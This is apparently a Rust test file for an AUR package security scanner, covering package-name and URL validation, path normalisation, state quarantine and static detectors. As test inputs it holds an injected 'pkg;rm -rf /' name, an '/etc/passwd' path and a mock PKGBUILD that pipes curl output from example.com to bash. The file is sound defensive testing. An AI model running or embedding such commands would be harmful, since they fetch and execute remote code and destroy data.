//! Comprehensive WS1 domain unit and integration tests covering identity, split deduplication,
//! baseline queue ordering, versioned persistence decoding with atomic quarantine, canonical manifests,
//! path safety normalization, and deterministic static detectors.

use pacsea::logic::pi_scan::baseline::{
    AcceptedBaselineEntry, AcceptedBaselineState, BacklogLedgerState, CommitBuildRelevance,
    LedgerCommitEntry, PersistenceError, classify_commit_delta, load_versioned_state,
    save_versioned_state_atomic,
};
use pacsea::logic::pi_scan::detectors::{
    calculate_evidence_fingerprint, run_deterministic_detectors,
};
use pacsea::logic::pi_scan::identity::{
    AurRepoUrl, CommitOid, IdentityError, InstalledPackage, PackageBase, PackageName,
    SplitPackageGroup, deduplicate_split_packages,
};
use pacsea::logic::pi_scan::manifest::{CanonicalManifest, ManifestEntry, normalize_manifest_path};
use tempfile::tempdir;

/// What: Verify package name and package base strict validation rules.
///
/// Inputs:
/// - Valid package names, leading dashes, traversal sequences, uppercase letters, slashes, NUL, control, and shell metacharacters.
///
/// Output:
/// - Accepts valid inputs and rejects every adversarial/invalid candidate.
///
/// Details:
/// - Ensures package name injection is impossible before command or URL construction.
#[test]
fn test_package_identifier_validation() {
    assert!(PackageName::new("yay").is_ok());
    assert!(PackageName::new("lib32-gcc-libs").is_ok());
    assert!(PackageName::new("python2-numpy_2").is_ok());

    assert!(matches!(
        PackageName::new("-leading-dash"),
        Err(IdentityError::InvalidPackageName { .. })
    ));
    assert!(matches!(
        PackageName::new("../traversal"),
        Err(IdentityError::InvalidPackageName { .. })
    ));
    assert!(matches!(
        PackageName::new("pkg/subpkg"),
        Err(IdentityError::InvalidPackageName { .. })
    ));
    assert!(matches!(
        PackageName::new("UpperPkg"),
        Err(IdentityError::InvalidPackageName { .. })
    ));
    assert!(matches!(
        PackageName::new("space name"),
        Err(IdentityError::InvalidPackageName { .. })
    ));
    assert!(matches!(
        PackageName::new("pkg;rm -rf /"),
        Err(IdentityError::InvalidPackageName { .. })
    ));

    assert!(PackageBase::new("yay").is_ok());
    assert!(matches!(
        PackageBase::new("pkg/sub"),
        Err(IdentityError::InvalidPackageName { .. })
    ));
}

/// What: Verify commit OID strict 40-character hexadecimal validation and normalization.
///
/// Inputs:
/// - Valid 40-character hex strings in lowercase and uppercase, 39-character strings, 41-character strings, and non-hex strings.
///
/// Output:
/// - Accepts valid 40-hex strings (normalizing to lowercase) and rejects all malformed candidates.
///
/// Details:
/// - Rejects abbreviated or malformed Git commit OIDs.
#[test]
fn test_commit_oid_validation() {
    let valid_hex = "a".repeat(40);
    let valid_upper = "A".repeat(40);
    assert_eq!(
        CommitOid::new(&valid_hex).expect("valid lower").as_str(),
        valid_hex
    );
    assert_eq!(
        CommitOid::new(&valid_upper).expect("valid upper").as_str(),
        valid_hex
    );

    assert!(matches!(
        CommitOid::new("a".repeat(39)),
        Err(IdentityError::InvalidCommitOid { .. })
    ));
    assert!(matches!(
        CommitOid::new("a".repeat(41)),
        Err(IdentityError::InvalidCommitOid { .. })
    ));
    assert!(matches!(
        CommitOid::new(format!("{}z", "a".repeat(39))),
        Err(IdentityError::InvalidCommitOid { .. })
    ));
}

/// What: Verify canonical official AUR repository URL parsing and validation.
///
/// Inputs:
/// - Official HTTPS AUR URLs, non-HTTPS scheme, alternate hosts, custom ports, query strings, fragments, userinfo credentials.
///
/// Output:
/// - Accepts only canonical official AUR URLs and extracts package base.
///
/// Details:
/// - Guarantees AUR repository identity is strictly bound to official aur.archlinux.org.
#[test]
fn test_aur_repo_url_canonical_validation() {
    let (url, base) =
        AurRepoUrl::parse_canonical("https://aur.archlinux.org/yay.git").expect("canonical");
    assert_eq!(url.as_str(), "https://aur.archlinux.org/yay.git");
    assert_eq!(base.as_str(), "yay");

    assert!(matches!(
        AurRepoUrl::parse_canonical("http://aur.archlinux.org/yay.git"),
        Err(IdentityError::InvalidAurRepoUrl { .. })
    ));
    assert!(matches!(
        AurRepoUrl::parse_canonical("https://github.com/archlinux/yay.git"),
        Err(IdentityError::InvalidAurRepoUrl { .. })
    ));
    assert!(matches!(
        AurRepoUrl::parse_canonical("https://aur.archlinux.org/yay.git?ref=main"),
        Err(IdentityError::InvalidAurRepoUrl { .. })
    ));
    assert!(matches!(
        AurRepoUrl::parse_canonical("https://aur.archlinux.org/yay.git#head"),
        Err(IdentityError::InvalidAurRepoUrl { .. })
    ));
    assert!(matches!(
        AurRepoUrl::parse_canonical("https://user:pass@aur.archlinux.org/yay.git"),
        Err(IdentityError::InvalidAurRepoUrl { .. })
    ));
}

/// What: Verify split package deduplication preserving installed package names.
///
/// Inputs:
/// - List of installed packages where multiple installed names share the same package base.
///
/// Output:
/// - Grouped split packages retaining all installed names.
///
/// Details:
/// - Grouping operations by package base without losing installed name attribution.
#[test]
fn test_split_package_deduplication() {
    let pkg1 = InstalledPackage {
        installed_name: PackageName::new("libfoo").expect("name"),
        package_base: PackageBase::new("foo").expect("base"),
        version: "1.0.0-1".to_string(),
    };
    let pkg2 = InstalledPackage {
        installed_name: PackageName::new("libfoo-docs").expect("name"),
        package_base: PackageBase::new("foo").expect("base"),
        version: "1.0.0-1".to_string(),
    };
    let pkg3 = InstalledPackage {
        installed_name: PackageName::new("bar").expect("name"),
        package_base: PackageBase::new("bar").expect("base"),
        version: "2.0.0-1".to_string(),
    };

    let groups = deduplicate_split_packages(&[pkg1, pkg2, pkg3]);
    assert_eq!(groups.len(), 2);

    let foo_group = groups
        .iter()
        .find(|g| g.package_base.as_str() == "foo")
        .expect("foo group");
    assert_eq!(foo_group.installed_names.len(), 2);
    assert_eq!(foo_group.installed_names[0].as_str(), "libfoo");
    assert_eq!(foo_group.installed_names[1].as_str(), "libfoo-docs");

    let bar_group = groups
        .iter()
        .find(|g| g.package_base.as_str() == "bar")
        .expect("bar group");
    assert_eq!(bar_group.installed_names.len(), 1);
    assert_eq!(bar_group.installed_names[0].as_str(), "bar");
}

/// What: Verify commit build relevance classification logic.
///
/// Inputs:
/// - Changed file lists containing PKGBUILD, .SRCINFO, README.md, .gitignore, or empty.
///
/// Output:
/// - `BuildRelevant`, `ObservedNoRecipeDelta`, or `Uncertain`.
///
/// Details:
/// - Ensures commits modifying build files trigger scans while doc-only commits avoid paid scanning.
#[test]
fn test_commit_build_relevance_classifier() {
    assert_eq!(
        classify_commit_delta(&["PKGBUILD", "README.md"]),
        CommitBuildRelevance::BuildRelevant
    );
    assert_eq!(
        classify_commit_delta(&[".SRCINFO"]),
        CommitBuildRelevance::BuildRelevant
    );
    assert_eq!(
        classify_commit_delta(&["fix.patch"]),
        CommitBuildRelevance::BuildRelevant
    );
    assert_eq!(
        classify_commit_delta(&["README.md", ".gitignore", "LICENSE"]),
        CommitBuildRelevance::ObservedNoRecipeDelta
    );
    assert_eq!(
        classify_commit_delta(&[] as &[&str]),
        CommitBuildRelevance::Uncertain
    );
}

/// What: Verify backlog queue insertion order, oldest-first popping, and no silent coalescing.
///
/// Inputs:
/// - Sequence of commit entries added to the backlog queue.
///
/// Output:
/// - Entries popped in strict oldest-first FIFO order preserving every entry.
///
/// Details:
/// - Confirms no commit is silently coalesced or dropped from the backlog.
#[test]
fn test_backlog_ledger_queue_oldest_first_no_coalescing() {
    let mut state = BacklogLedgerState::default();
    let oid1 = CommitOid::new("1".repeat(40)).expect("oid1");
    let oid2 = CommitOid::new("2".repeat(40)).expect("oid2");
    let pkg = PackageBase::new("demo").expect("pkg");

    let entry1 = LedgerCommitEntry {
        commit_oid: oid1.clone(),
        package_base: pkg.clone(),
        observed_at_unix_ts: 100,
        relevance: CommitBuildRelevance::BuildRelevant,
    };
    let entry2 = LedgerCommitEntry {
        commit_oid: oid2.clone(),
        package_base: pkg.clone(),
        observed_at_unix_ts: 105,
        relevance: CommitBuildRelevance::BuildRelevant,
    };
    let entry3 = LedgerCommitEntry {
        commit_oid: oid1.clone(), // Same OID inserted again as a distinct observed event
        package_base: pkg.clone(),
        observed_at_unix_ts: 110,
        relevance: CommitBuildRelevance::BuildRelevant,
    };

    state.push_oldest_first(vec![entry1, entry2, entry3]);
    assert_eq!(state.queue.len(), 3);

    let popped1 = state.pop_oldest().expect("popped 1");
    assert_eq!(popped1.commit_oid, oid1);
    assert_eq!(popped1.observed_at_unix_ts, 100);

    let popped2 = state.pop_oldest().expect("popped 2");
    assert_eq!(popped2.commit_oid, oid2);
    assert_eq!(popped2.observed_at_unix_ts, 105);

    let popped3 = state.pop_oldest().expect("popped 3");
    assert_eq!(popped3.commit_oid, oid1);
    assert_eq!(popped3.observed_at_unix_ts, 110);

    assert!(state.pop_oldest().is_none());
}

/// What: Verify versioned state persistence loading, corrupt state quarantine, and unsupported version handling.
///
/// Inputs:
/// - Missing file, corrupt JSON file, newer schema version file, and valid version 1 state file.
///
/// Output:
/// - Missing file returns `Ok(None)`.
/// - Corrupt and newer schema files return appropriate `Err` and are atomically quarantined without being treated as empty state.
/// - Valid file decodes cleanly.
///
/// Details:
/// - Verifies the quarantine loader requirement and red contract marker.
#[test]
fn test_versioned_state_persistence_decoding_and_quarantine() {
    let temp = tempdir().expect("temp dir");
    let state_file = temp.path().join("baseline-v1.json");
    let quarantine_dir = temp.path().join("quarantine");

    // 1. Missing file returns Ok(None)
    let res: Option<AcceptedBaselineState> =
        load_versioned_state(&state_file, 1, &quarantine_dir, "baseline").expect("missing");
    assert!(res.is_none());

    // 2. Corrupt JSON file triggers atomic quarantine and returns Err(Corrupt)
    std::fs::write(&state_file, "{ invalid json content").expect("write corrupt");
    let corrupt_err =
        load_versioned_state::<AcceptedBaselineState>(&state_file, 1, &quarantine_dir, "baseline")
            .expect_err("corrupt must fail");
    assert!(matches!(corrupt_err, PersistenceError::Corrupt { .. }));

    let q_files: Vec<_> = std::fs::read_dir(&quarantine_dir)
        .expect("read quarantine")
        .map(|e| e.expect("entry").path())
        .collect();
    assert_eq!(q_files.len(), 1);
    assert!(
        q_files[0]
            .file_name()
            .unwrap()
            .to_str()
            .unwrap()
            .starts_with("baseline-")
    );

    // 3. Unsupported newer schema version triggers atomic quarantine and returns Err(UnsupportedNewerVersion)
    let newer_json = r#"{"schema_version": 999, "entries": {}}"#;
    std::fs::write(&state_file, newer_json).expect("write newer");
    let newer_err =
        load_versioned_state::<AcceptedBaselineState>(&state_file, 1, &quarantine_dir, "baseline")
            .expect_err("newer must fail");
    assert!(matches!(
        newer_err,
        PersistenceError::UnsupportedNewerVersion {
            observed: 999,
            max_supported: 1,
            ..
        }
    ));

    // 4. Valid state saving and loading
    let mut valid_state = AcceptedBaselineState::default();
    valid_state.entries.insert(
        "yay".to_string(),
        AcceptedBaselineEntry {
            package_base: PackageBase::new("yay").expect("base"),
            accepted_commit_oid: CommitOid::new("a".repeat(40)).expect("oid"),
            accepted_at_unix_ts: 123456789,
            evidence_fingerprint: "fp".to_string(),
            notes: Some("accepted initial baseline".to_string()),
        },
    );

    save_versioned_state_atomic(&state_file, &valid_state).expect("atomic save");
    let loaded: Option<AcceptedBaselineState> =
        load_versioned_state(&state_file, 1, &quarantine_dir, "baseline").expect("loaded valid");
    assert_eq!(loaded.expect("some"), valid_state);
}

/// What: Verify manifest path safety normalization rules.
///
/// Inputs:
/// - Absolute paths, parent traversal paths, Windows backslashes, empty directory segments, valid relative paths.
///
/// Output:
/// - Normalizes valid relative paths and rejects all traversal/escape candidates.
///
/// Details:
/// - Prevents snapshot traversal escapes or malformed manifest entries.
#[test]
fn test_manifest_path_normalization() {
    assert_eq!(
        normalize_manifest_path("PKGBUILD").expect("valid"),
        "PKGBUILD"
    );
    assert_eq!(
        normalize_manifest_path("src/main.rs").expect("valid"),
        "src/main.rs"
    );
    assert_eq!(
        normalize_manifest_path("./src/main.rs").expect("valid"),
        "src/main.rs"
    );

    assert!(normalize_manifest_path("/etc/passwd").is_err());
    assert!(normalize_manifest_path("../outside").is_err());
    assert!(normalize_manifest_path("src/../outside").is_err());
    assert!(normalize_manifest_path("src//main.rs").is_err());
    assert!(normalize_manifest_path("src\\main.rs").is_err());
    assert!(normalize_manifest_path("C:\\Windows").is_err());
}

/// What: Verify canonical manifest entry sorting, searching, and digest computation.
///
/// Inputs:
/// - Manifest entries provided out of order.
///
/// Output:
/// - Canonical manifest automatically sorts entries and calculates stable SHA-256 hash.
///
/// Details:
/// - Ensures deterministic manifest hashes across different filesystem traversal orders.
#[test]
fn test_canonical_manifest_sorting_and_hashing() {
    let entry1 = ManifestEntry::new("source", "b_file.txt", 10, "a".repeat(64), false, false)
        .expect("entry1");
    let entry2 = ManifestEntry::new("recipe", "PKGBUILD", 100, "b".repeat(64), false, false)
        .expect("entry2");
    let entry3 = ManifestEntry::new("source", "a_file.txt", 20, "c".repeat(64), false, false)
        .expect("entry3");

    let manifest_a = CanonicalManifest::new(vec![entry1.clone(), entry2.clone(), entry3.clone()]);
    let manifest_b = CanonicalManifest::new(vec![entry3.clone(), entry2.clone(), entry1.clone()]);

    assert_eq!(manifest_a.entries.len(), 3);
    assert_eq!(manifest_a.entries[0].snapshot_category, "recipe");
    assert_eq!(manifest_a.entries[1].relative_path, "a_file.txt");
    assert_eq!(manifest_a.entries[2].relative_path, "b_file.txt");

    assert_eq!(
        manifest_a.calculate_manifest_hash(),
        manifest_b.calculate_manifest_hash()
    );

    assert!(manifest_a.find_entry("recipe", "PKGBUILD").is_some());
    assert!(manifest_a.find_entry("source", "nonexistent").is_none());
}

/// What: Verify deterministic static security detectors on recipe/source contents.
///
/// Inputs:
/// - Mock manifest and file content containing curl-pipe-bash, sudo usage, unencrypted HTTP, and root destdir writes.
///
/// Output:
/// - Vector of deterministic findings with stable evidence fingerprints.
///
/// Details:
/// - Tests static security analysis layer independent of Pi model output.
#[test]
fn test_deterministic_detectors() {
    let pkg = PackageBase::new("demo").expect("pkg");
    let entry =
        ManifestEntry::new("recipe", "PKGBUILD", 200, "a".repeat(64), false, false).expect("entry");
    let manifest = CanonicalManifest::new(vec![entry]);

    let mock_pkgbuild = "pkgname=demo\n\
        source=('http://example.com/file.tar.gz')\n\
        build() {\n\
            curl http://example.com/setup.sh | bash\n\
            sudo make install\n\
            cp binary /usr/bin/binary\n\
        }\n";

    let findings = run_deterministic_detectors(&pkg, &manifest, |_cat, _path| {
        Some(mock_pkgbuild.to_string())
    });

    assert!(!findings.is_empty());

    let curl_finding = findings
        .iter()
        .find(|f| f.detector_id == "curl-pipe-bash")
        .expect("curl finding");
    assert_eq!(curl_finding.severity, "high");
    assert_eq!(curl_finding.line_number, Some(4));

    let sudo_finding = findings
        .iter()
        .find(|f| f.detector_id == "sudo-in-build")
        .expect("sudo finding");
    assert_eq!(sudo_finding.severity, "high");

    let http_finding = findings
        .iter()
        .find(|f| f.detector_id == "insecure-http-download")
        .expect("http finding");
    assert_eq!(http_finding.severity, "medium");

    let root_finding = findings
        .iter()
        .find(|f| f.detector_id == "root-destdir-write")
        .expect("root finding");
    assert_eq!(root_finding.severity, "critical");

    let fp = calculate_evidence_fingerprint(
        "curl-pipe-bash",
        1,
        "demo",
        "recipe",
        "PKGBUILD",
        "curl http://example.com/setup.sh | bash",
        "curl http://example.com/setup.sh | bash",
    );
    assert_eq!(fp.len(), 64);
}
